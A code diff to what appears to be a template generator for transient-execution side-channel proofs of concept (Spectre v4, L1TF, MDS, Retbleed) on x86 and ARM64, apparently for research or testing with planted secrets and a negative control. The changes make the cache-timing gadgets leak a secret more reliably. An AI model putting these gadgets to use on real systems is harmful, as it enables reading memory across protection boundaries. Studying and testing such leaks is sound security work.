@@ -205,27 +205,36 @@ int main() {{
 _V4_X86 = r'''
 #include "utils.c"
 // Synthesized SPECTRE_V4 gadget (Speculative Store Bypass). Fresh design
-// (no canonical PoC in c_vulns/c_code/): a store whose address was just
-// clflush'd is slow to retire, so a dependent load through an aliased
-// pointer speculatively reads the stale value at that location before the
-// store commits, and that stale value is the planted secret.
+// (no canonical PoC in c_vulns/c_code/): one slot holds the secret. It is
+// clflush'd, then a slow store of a PUBLIC value targets that SAME slot;
+// immediately after, a load from that same address may bypass the
+// not-yet-retired store (the CPU's memory disambiguator speculates the
+// load does not alias the pending store) and forward the stale value that
+// was resident before the flush -- the secret.
 uint8_t secret_v4 = {secret};
-uint8_t *secret_ptr_v4 = &secret_v4;
-uint8_t staging_v4 = 0;
-uint8_t *store_ptr_v4 = &staging_v4;
+uint8_t ssb_slot_v4 = 0;
+uint8_t *ssb_ptr_v4 = &ssb_slot_v4;
+uint8_t public_store_val_v4 = 0;
 
 __attribute__((noinline)) void ssb_train_step(void) {{
-    staging_v4 = 0;
-    volatile uint8_t v = staging_v4;
+    // Train the store-to-load path on a non-aliasing pair so the
+    // disambiguator is biased toward "no alias" before the real,
+    // aliasing store+load in ssb_gadget() below.
+    uint8_t tmp_v4 = 0;
+    uint8_t *tmp_ptr_v4 = &tmp_v4;
+    *tmp_ptr_v4 = 0;
+    volatile uint8_t v = *tmp_ptr_v4;
     (void)v;
 }}
 
 __attribute__((noinline)) void ssb_gadget(void) {{
-    _mm_clflush(store_ptr_v4);
-    *store_ptr_v4 = 0;
+    ssb_slot_v4 = secret_v4;
+    _mm_clflush(ssb_ptr_v4);
+    _mm_mfence();
+    *ssb_ptr_v4 = public_store_val_v4;
     /*SPEC_WINDOW*/
     __asm__ __volatile__({pad} ::: "memory");
-    volatile uint8_t value = *secret_ptr_v4;
+    volatile uint8_t value = *ssb_ptr_v4;
     probe_array[value * CACHE_LINE_SIZE] = 1;
 }}
 
@@ -250,24 +259,36 @@ _V4_ARM64 = r'''
 #include "utils_arm64.c"
 // Synthesized SPECTRE_V4 gadget (Speculative Store Bypass), ARM64. Fresh
 // design; utils_arm64.c provides _mm_clflush/_mm_mfence/_mm_lfence under
-// the same names (dc civac / dsb ish), so the body is arch-agnostic.
+// the same names (dc civac / dsb ish), so the body is arch-agnostic. One
+// slot holds the secret. It is clflush'd, then a slow store of a PUBLIC
+// value targets that SAME slot; immediately after, a load from that same
+// address may bypass the not-yet-retired store (the CPU's memory
+// disambiguator speculates the load does not alias the pending store) and
+// forward the stale value that was resident before the flush -- the secret.
 uint8_t secret_v4 = {secret};
-uint8_t *secret_ptr_v4 = &secret_v4;
-uint8_t staging_v4 = 0;
-uint8_t *store_ptr_v4 = &staging_v4;
+uint8_t ssb_slot_v4 = 0;
+uint8_t *ssb_ptr_v4 = &ssb_slot_v4;
+uint8_t public_store_val_v4 = 0;
 
 __attribute__((noinline)) void ssb_train_step(void) {{
-    staging_v4 = 0;
-    volatile uint8_t v = staging_v4;
+    // Train the store-to-load path on a non-aliasing pair so the
+    // disambiguator is biased toward "no alias" before the real,
+    // aliasing store+load in ssb_gadget() below.
+    uint8_t tmp_v4 = 0;
+    uint8_t *tmp_ptr_v4 = &tmp_v4;
+    *tmp_ptr_v4 = 0;
+    volatile uint8_t v = *tmp_ptr_v4;
     (void)v;
 }}
 
 __attribute__((noinline)) void ssb_gadget(void) {{
-    _mm_clflush(store_ptr_v4);
-    *store_ptr_v4 = 0;
+    ssb_slot_v4 = secret_v4;
+    _mm_clflush(ssb_ptr_v4);
+    _mm_mfence();
+    *ssb_ptr_v4 = public_store_val_v4;
     /*SPEC_WINDOW*/
     __asm__ __volatile__({pad} ::: "memory");
-    volatile uint8_t value = *secret_ptr_v4;
+    volatile uint8_t value = *ssb_ptr_v4;
     probe_array[value * CACHE_LINE_SIZE] = 1;
 }}
 
@@ -296,12 +317,22 @@ _L1TF_X86 = r'''
 #include "utils.c"
 // Synthesized L1TF gadget (Foreshadow-style transient read of an unmapped
 // but still-cached page). Distilled from l1tf.c.
+// The transmit below indexes probe_array via a hardcoded "shl $6" (2**6 ==
+// CACHE_LINE_SIZE) rather than a C-level "* CACHE_LINE_SIZE" (inline asm
+// needs a literal immediate); this assert keeps that immediate honest.
+_Static_assert(CACHE_LINE_SIZE == 64, "L1TF asm shift assumes stride 64 (2**6)");
 uint8_t secret_l1tf_byte = {secret};
 volatile uint8_t *g_l1tf_secret_page = NULL;
 static sigjmp_buf jmpbuf_l1tf;
 
 void sigsegv_handler_l1tf(int sig) {{
-    signal(SIGSEGV, SIG_DFL);
+    // Handler stays installed across all retry attempts (no reset-to-
+    // SIG_DFL) since the protected-page read faults on every attempt on
+    // hosts where this speculative read is never actually satisfied.
+    // Catches both SIGSEGV (typical Linux behavior for a PROT_NONE access)
+    // and SIGBUS (observed on this arm64/macOS host for the same access) --
+    // registered for both below -- so neither manifests as an uncaught
+    // crash.
     siglongjmp(jmpbuf_l1tf, 1);
 }}
 
@@ -318,6 +349,7 @@ int main() {{
     if (g_l1tf_secret_page == MAP_FAILED) {{ return 1; }}
     *(g_l1tf_secret_page + 0x100) = secret_l1tf_byte;
     if (signal(SIGSEGV, sigsegv_handler_l1tf) == SIG_ERR) {{ return 1; }}
+    if (signal(SIGBUS, sigsegv_handler_l1tf) == SIG_ERR) {{ return 1; }}
     if (mprotect((void *)g_l1tf_secret_page, page_size, PROT_NONE) == -1) {{ return 1; }}
 
     for (int i = 0; i < {train_iters}; i++) {{
@@ -333,7 +365,7 @@ int main() {{
             __asm__ __volatile__(
                 "1:\n\t"
                 "movq (%0), %%rax\n\t"
-                "shl $12, %%rax\n\t"
+                "shl $6, %%rax\n\t"
                 "movq (%1, %%rax, 1), %%rbx\n"
                 "2:\n\t"
                 :
@@ -357,12 +389,22 @@ _L1TF_ARM64 = r'''
 #include "utils_arm64.c"
 // Synthesized L1TF gadget (Foreshadow-style transient read of an unmapped
 // but still-cached page), ARM64. Distilled from l1tf_arm64.c.
+// The transmit below indexes probe_array via a hardcoded "lsl #6" (2**6 ==
+// CACHE_LINE_SIZE) rather than a C-level "* CACHE_LINE_SIZE" (inline asm
+// needs a literal immediate); this assert keeps that immediate honest.
+_Static_assert(CACHE_LINE_SIZE == 64, "L1TF asm shift assumes stride 64 (2**6)");
 uint8_t secret_l1tf_byte = {secret};
 volatile uint8_t *g_l1tf_secret_page = NULL;
 static sigjmp_buf jmpbuf_l1tf;
 
 void sigsegv_handler_l1tf(int sig) {{
-    signal(SIGSEGV, SIG_DFL);
+    // Handler stays installed across all retry attempts (no reset-to-
+    // SIG_DFL) since the protected-page read faults on every attempt on
+    // hosts where this speculative read is never actually satisfied.
+    // Catches both SIGSEGV (typical Linux behavior for a PROT_NONE access)
+    // and SIGBUS (observed on this arm64/macOS host for the same access) --
+    // registered for both below -- so neither manifests as an uncaught
+    // crash.
     siglongjmp(jmpbuf_l1tf, 1);
 }}
 
@@ -379,6 +421,7 @@ int main() {{
     if (g_l1tf_secret_page == MAP_FAILED) {{ return 1; }}
     *(g_l1tf_secret_page + 0x100) = secret_l1tf_byte;
     if (signal(SIGSEGV, sigsegv_handler_l1tf) == SIG_ERR) {{ return 1; }}
+    if (signal(SIGBUS, sigsegv_handler_l1tf) == SIG_ERR) {{ return 1; }}
     if (mprotect((void *)g_l1tf_secret_page, page_size, PROT_NONE) == -1) {{ return 1; }}
 
     for (int i = 0; i < {train_iters}; i++) {{
@@ -394,7 +437,7 @@ int main() {{
             __asm__ __volatile__(
                 "1:\n\t"
                 "ldr x0, [%0]\n\t"
-                "lsl x0, x0, #12\n\t"
+                "lsl x0, x0, #6\n\t"
                 "ldr x1, [%1, x0]\n\t"
                 "2:\n\t"
                 :
@@ -455,7 +498,7 @@ int main() {{
             __asm__ __volatile__(
                 "xor %%eax, %%eax\n\t"
                 "movb %0, %%al\n\t"
-                "shl $12, %%rax\n\t"
+                "shl $6, %%rax\n\t"
                 "movq (%1, %%rax, 1), %%rbx\n"
                 :
                 : "r"(secret_mds_byte), "r"(probe_array)
@@ -511,7 +554,7 @@ int main() {{
             __asm__ __volatile__(
                 "eor x0, x0, x0\n\t"
                 "ldrb w0, [%0]\n\t"
-                "lsl x0, x0, #12\n\t"
+                "lsl x0, x0, #6\n\t"
                 "ldr x1, [%1, x0]\n\t"
                 :
                 : "r"(&secret_mds_byte), "r"(probe_array)
@@ -557,9 +600,13 @@ __attribute__((noinline)) void retbleed_train_step(void) {{
 }}
 
 __attribute__((noinline)) void victim_function_with_return_retbleed(uint8_t value_for_gadget) {{
+    // Stage the secret into rdi -- the SysV AMD64 register leak_gadget_retbleed
+    // (uint8_t value) actually reads its first argument from -- so that if
+    // the CPU misdirects here (see below), leak_gadget_retbleed observes the
+    // live secret in the register it expects.
     __asm__ __volatile__(
-        "mov %0, %%r9\n\t"
-        : : "r"((uint64_t)value_for_gadget) : "r9");
+        "mov %0, %%rdi\n\t"
+        : : "r"((uint64_t)value_for_gadget) : "rdi");
     /*SPEC_WINDOW*/
     __asm__ __volatile__({pad} ::: "memory");
     // Implicit 'ret' below is the misdirection target: architecturally
@@ -609,9 +656,13 @@ __attribute__((noinline)) void retbleed_train_step(void) {{
 }}
 
 __attribute__((noinline)) void victim_function_with_return_retbleed(uint8_t value_for_gadget) {{
+    // Stage the secret into x0 -- the AAPCS64 register leak_gadget_retbleed
+    // (uint8_t value) actually reads its first argument from -- so that if
+    // the CPU misdirects here (see below), leak_gadget_retbleed observes the
+    // live secret in the register it expects.
     __asm__ __volatile__(
-        "mov x9, %0\n\t"
-        : : "r"((uint64_t)value_for_gadget) : "x9");
+        "mov x0, %0\n\t"
+        : : "r"((uint64_t)value_for_gadget) : "x0");
     /*SPEC_WINDOW*/
     __asm__ __volatile__({pad} ::: "memory");
     // Implicit 'ret' below is the misdirection target (see x86 template).
@@ -859,8 +910,11 @@ int main() {{
     _mm_mfence();
     flush_probe_array();
     _mm_lfence();
-    // Only ever transmit a PUBLIC value, never the secret.
-    volatile uint8_t v = public_b[secret_benign % 16];
+    // Only ever transmit a PUBLIC, secret-INDEPENDENT value: a fixed index
+    // into the public array. Never derive the index (or the transmitted
+    // value) from secret_benign -- that is the entire point of the
+    // negative control.
+    volatile uint8_t v = public_b[3];
     probe_array[v * CACHE_LINE_SIZE] = 1;
     /*SPEC_WINDOW*/
     __asm__ __volatile__({pad} ::: "memory");
@@ -887,8 +941,11 @@ int main() {{
     _mm_mfence();
     flush_probe_array();
     _mm_lfence();
-    // Only ever transmit a PUBLIC value, never the secret.
-    volatile uint8_t v = public_b[secret_benign % 16];
+    // Only ever transmit a PUBLIC, secret-INDEPENDENT value: a fixed index
+    // into the public array. Never derive the index (or the transmitted
+    // value) from secret_benign -- that is the entire point of the
+    // negative control.
+    volatile uint8_t v = public_b[3];
     probe_array[v * CACHE_LINE_SIZE] = 1;
     /*SPEC_WINDOW*/
     __asm__ __volatile__({pad} ::: "memory");
